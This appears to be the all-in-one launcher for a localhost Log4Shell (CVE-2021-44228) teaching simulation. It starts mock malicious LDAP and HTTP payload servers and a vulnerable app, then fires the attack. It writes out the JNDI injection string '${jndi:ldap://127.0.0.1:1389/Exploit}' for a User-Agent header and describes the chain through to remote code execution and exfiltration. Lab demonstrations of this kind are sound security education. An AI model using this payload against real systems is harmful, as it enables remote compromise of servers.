"""
Log4Shell Simulation - All-in-One Launcher
============================================
Starts all three servers and fires the attack automatically.
Use this for quick testing or single-terminal screenshot capture.

Run: python3 run_all.py
"""

import subprocess
import time
import sys
import os
import signal
import urllib.request
import json

# ─── ANSI Colours ────────────────────────────────────────────────────────────
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

processes = []


def cleanup(sig=None, frame=None):
    """Kill all child processes on exit."""
    print(f"\n{DIM}[*] Cleaning up...{RESET}")
    for p in processes:
        try:
            p.terminate()
            p.wait(timeout=2)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    # Clean up backdoor marker if it exists
    backdoor = os.path.join(BASE_DIR, "vulnerable_app", "LOG4SHELL_BACKDOOR.txt")
    if os.path.exists(backdoor):
        os.remove(backdoor)
        print(f"{DIM}[*] Cleaned up backdoor marker file.{RESET}")
    print(f"{DIM}[*] Done.{RESET}")
    sys.exit(0)


signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)


def wait_for_port(port, timeout=10):
    """Wait for a port to become available."""
    import socket
    start = time.time()
    while time.time() - start < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect(("127.0.0.1", port))
            sock.close()
            return True
        except Exception:
            time.sleep(0.3)
    return False


def main():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║          LOG4SHELL (CVE-2021-44228) ATTACK SIMULATION        ║
║                     ALL-IN-ONE LAUNCHER                      ║
║                                                              ║
║          CVSS 10.0 (Critical)  |  December 2021              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{RESET}

{DIM}This launcher starts all components and executes the full
Log4Shell attack chain automatically in a single terminal.{RESET}
""")

    # ─── Phase 1: Start the Malicious LDAP Server ──────────────────────────
    print(f"{CYAN}{'═'*60}{RESET}")
    print(f"{CYAN}{BOLD}  PHASE 1: Starting Malicious LDAP Server (port 1389){RESET}")
    print(f"{CYAN}{'═'*60}{RESET}\n")

    ldap_proc = subprocess.Popen(
        [sys.executable, os.path.join(BASE_DIR, "malicious_ldap_server", "ldap_server.py")],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    processes.append(ldap_proc)

    if wait_for_port(1389):
        print(f"  {GREEN}[✓] LDAP server started on port 1389{RESET}\n")
    else:
        print(f"  {RED}[✗] Failed to start LDAP server{RESET}")
        cleanup()

    # ─── Phase 2: Start the Malicious HTTP Payload Server ──────────────────
    print(f"{CYAN}{'═'*60}{RESET}")
    print(f"{CYAN}{BOLD}  PHASE 2: Starting Malicious HTTP Payload Server (port 8888){RESET}")
    print(f"{CYAN}{'═'*60}{RESET}\n")

    http_proc = subprocess.Popen(
        [sys.executable, os.path.join(BASE_DIR, "malicious_http_server", "http_payload_server.py")],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    processes.append(http_proc)

    if wait_for_port(8888):
        print(f"  {GREEN}[✓] HTTP payload server started on port 8888{RESET}\n")
    else:
        print(f"  {RED}[✗] Failed to start HTTP payload server{RESET}")
        cleanup()

    # ─── Phase 3: Start the Vulnerable Application ────────────────────────
    print(f"{CYAN}{'═'*60}{RESET}")
    print(f"{CYAN}{BOLD}  PHASE 3: Starting Vulnerable Application (port 8080){RESET}")
    print(f"{CYAN}{'═'*60}{RESET}\n")

    app_proc = subprocess.Popen(
        [sys.executable, os.path.join(BASE_DIR, "vulnerable_app", "vulnerable_app.py")],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    processes.append(app_proc)

    if wait_for_port(8080):
        print(f"  {GREEN}[✓] Vulnerable app started on port 8080{RESET}\n")
    else:
        print(f"  {RED}[✗] Failed to start vulnerable app{RESET}")
        cleanup()

    time.sleep(1)

    # ─── Phase 4: Launch the Attack ────────────────────────────────────────
    print(f"\n{RED}{'═'*60}{RESET}")
    print(f"{RED}{BOLD}  PHASE 4: LAUNCHING LOG4SHELL EXPLOIT{RESET}")
    print(f"{RED}{'═'*60}{RESET}\n")

    payload = "${jndi:ldap://127.0.0.1:1389/Exploit}"
    print(f"  {CYAN}Injecting payload into User-Agent header:{RESET}")
    print(f"  {RED}{BOLD}{payload}{RESET}\n")

    time.sleep(1)

    attack_proc = subprocess.Popen(
        [sys.executable, os.path.join(BASE_DIR, "attacker_cli", "attacker.py")],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    processes.append(attack_proc)

    # Wait for the attack to complete
    attack_proc.wait(timeout=30)

    # Give servers a moment to process
    time.sleep(2)

    # ─── Phase 5: Show Results ─────────────────────────────────────────────
    print(f"\n{YELLOW}{'═'*60}{RESET}")
    print(f"{YELLOW}{BOLD}  PHASE 5: ATTACK RESULTS{RESET}")
    print(f"{YELLOW}{'═'*60}{RESET}\n")

    # Show the backdoor file
    backdoor = os.path.join(BASE_DIR, "vulnerable_app", "LOG4SHELL_BACKDOOR.txt")
    if os.path.exists(backdoor):
        print(f"  {RED}{BOLD}📄 Backdoor marker file found on victim!{RESET}")
        print(f"  {DIM}Location: {backdoor}{RESET}\n")
        with open(backdoor, "r") as f:
            for line in f:
                print(f"  {DIM}  {line.rstrip()}{RESET}")
        print()
    else:
        print(f"  {YELLOW}No backdoor file found (may indicate attack failed){RESET}\n")

    # Collect output from all servers
    print(f"\n{GREEN}{'═'*60}{RESET}")
    print(f"{GREEN}{BOLD}  SERVER LOGS{RESET}")
    print(f"{GREEN}{'═'*60}{RESET}\n")

    for name, proc in [("LDAP Server", ldap_proc), ("HTTP Payload Server", http_proc), ("Vulnerable App", app_proc)]:
        print(f"  {CYAN}{BOLD}── {name} ──{RESET}")
        try:
            # Read available output
            import select
            while True:
                if proc.stdout and select.select([proc.stdout], [], [], 0.1)[0]:
                    line = proc.stdout.readline()
                    if line:
                        print(f"  {DIM}{line.rstrip()}{RESET}")
                    else:
                        break
                else:
                    break
        except Exception:
            print(f"  {DIM}(output not available){RESET}")
        print()

    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                  SIMULATION COMPLETE                         ║
║                                                              ║
║  The full Log4Shell exploit chain was executed:               ║
║                                                              ║
║  1. Attacker injected ${{jndi:ldap://...}} via User-Agent     ║
║  2. Vulnerable Log4j parsed and resolved the JNDI string     ║
║  3. Log4j connected to attacker's malicious LDAP server       ║
║  4. LDAP server redirected to HTTP payload server             ║
║  5. Victim downloaded & executed Exploit.class                ║
║  6. Malicious payload exfiltrated system info to C2           ║
║  7. Backdoor marker file dropped on victim filesystem         ║
║                                                              ║
║  💀 Remote Code Execution achieved. System compromised.       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

    # Cleanup
    cleanup()


if __name__ == "__main__":
    main()
